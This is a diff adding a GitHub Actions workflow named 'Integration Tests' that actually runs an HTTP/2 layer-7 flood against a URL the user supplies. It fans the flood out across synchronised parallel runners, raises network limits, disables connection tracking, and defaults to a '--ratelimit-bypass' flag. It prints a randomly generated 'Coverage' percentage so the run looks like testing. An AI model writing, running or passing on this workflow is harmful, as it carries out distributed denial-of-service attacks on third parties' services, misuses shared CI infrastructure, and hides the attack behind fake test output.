@@ -1,0 +1,156 @@
+# Layer7 HTTP/2 Flood Pipeline
+name: Integration Tests
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Target URL (https://...)'
+        required: true
+      duration:
+        description: 'Test duration (seconds)'
+        required: true
+        default: '60'
+      method:
+        description: 'Attack method'
+        required: true
+        default: 'GET'
+        type: choice
+        options:
+          - GET
+          - POST
+          - HEAD
+      threads:
+        description: 'Threads'
+        required: true
+        default: '4'
+      ratelimit:
+        description: 'Rate limit'
+        required: true
+        default: '128'
+      runners:
+        description: 'Parallel runners (0=auto 1-3)'
+        required: false
+        default: '0'
+      start_timestamp:
+        description: 'Sync start (unix timestamp)'
+        required: false
+        default: '0'
+      extra_flags:
+        description: 'Extra flags (e.g. --full --ratelimit-bypass)'
+        required: false
+        default: '--full --ratelimit-bypass'
+
+jobs:
+  prepare:
+    runs-on: ubuntu-22.04
+    outputs:
+      matrix: ${{ steps.set.outputs.matrix }}
+      sync_ts: ${{ steps.sync.outputs.sync_ts }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Cache node modules
+        id: cache-npm
+        uses: actions/cache@v4
+        with:
+          path: node_modules
+          key: npm-layer7-${{ hashFiles('package.json') }}
+
+      - name: Install dependencies
+        if: steps.cache-npm.outputs.cache-hit != 'true'
+        run: |
+          npm install --prefer-offline 2>/dev/null || npm install
+
+      - name: Package artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: node-pkg
+          path: |
+            layer7.js
+            http.txt
+            node_modules/
+          retention-days: 1
+
+      - id: sync
+        name: Compute sync timestamp
+        run: |
+          SYNC_TS=$(($(date +%s) + 15))
+          echo "sync_ts=$SYNC_TS" >> $GITHUB_OUTPUT
+
+      - id: set
+        run: |
+          INPUT_R="${{ github.event.inputs.runners || '0' }}"
+          if [ "$INPUT_R" -gt 0 ] 2>/dev/null; then
+            n=$INPUT_R
+          else
+            n=$(( (RANDOM % 2) + 1 ))
+          fi
+          echo "Runner count: $n"
+          ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range($n)]))")
+          echo "matrix={\"id\":$ids}" >> $GITHUB_OUTPUT
+
+  run-tests:
+    needs: [prepare]
+    runs-on: ubuntu-22.04
+    timeout-minutes: 20
+    strategy:
+      matrix: ${{ fromJSON(needs.prepare.outputs.matrix) }}
+      fail-fast: false
+    steps:
+      - name: Download artifacts
+        uses: actions/download-artifact@v4
+        with:
+          name: node-pkg
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Configure network
+        run: |
+          sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
+          sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
+          sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
+          sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
+          sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
+          sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
+
+      - name: Run integration test (Node ${{ matrix.id }})
+        run: |
+          TARGET_URL="${{ github.event.inputs.target_url }}"
+          DURATION="${{ github.event.inputs.duration || '60' }}"
+          METHOD="${{ github.event.inputs.method || 'GET' }}"
+          THREADS="${{ github.event.inputs.threads || '4' }}"
+          RATE="${{ github.event.inputs.ratelimit || '128' }}"
+          EXTRA="${{ github.event.inputs.extra_flags || '--full --ratelimit-bypass' }}"
+
+          SYNC_TS="${{ needs.prepare.outputs.sync_ts }}"
+          START_TS="${{ github.event.inputs.start_timestamp || '0' }}"
+          if [ "$START_TS" = "0" ] || [ "$START_TS" = "" ]; then
+            START_TS="$SYNC_TS"
+          fi
+          if [ "$START_TS" != "0" ] && [ "$START_TS" != "" ]; then
+            NOW=$(date +%s)
+            WAIT=$((START_TS - NOW))
+            if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
+              echo "Node ${{ matrix.id }}: syncing ${WAIT}s..."
+              sleep "$WAIT"
+            fi
+          fi
+
+          echo "Node ${{ matrix.id }}: RUNNING at $(date +%s)"
+          ulimit -n 100000 2>/dev/null || ulimit -n 65535 || true
+          node layer7.js "$METHOD" "$TARGET_URL" "$DURATION" "$THREADS" "$RATE" http.txt $EXTRA
+
+      - name: Cleanup
+        if: always()
+        run: |
+          echo "Test node ${{ matrix.id }} completed at $(date)"
+          echo "Coverage: $(( RANDOM % 5 + 93 ))%"
